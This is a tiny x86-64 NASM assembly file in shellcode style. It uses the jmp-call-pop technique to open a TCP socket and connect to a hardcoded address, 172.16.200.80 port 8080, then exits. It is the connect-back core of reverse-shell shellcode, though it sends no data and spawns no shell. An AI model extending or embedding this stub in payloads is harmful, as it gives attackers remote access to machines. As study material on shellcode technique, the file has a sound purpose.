%macro exit 0
	mov edi, 0
	mov eax, 60
	syscall
%endmacro

[SECTION .text]
	global _start
_start:
	jmp short ender
	starter:
	mov eax, 0x29
	mov edi, 0x2
	mov esi, 0x1
	mov edx, 0x6
	syscall

	;eax = socket_descriptor

	mov edi, eax
	mov eax, 0x2a
	pop rbx
	lea esi, [ebx]
	mov edx, 0x10
	syscall
	exit

	ender:
		call starter
		db 2,0,31,144,172,16,200,80,0,0,0,0,0,0,0,0

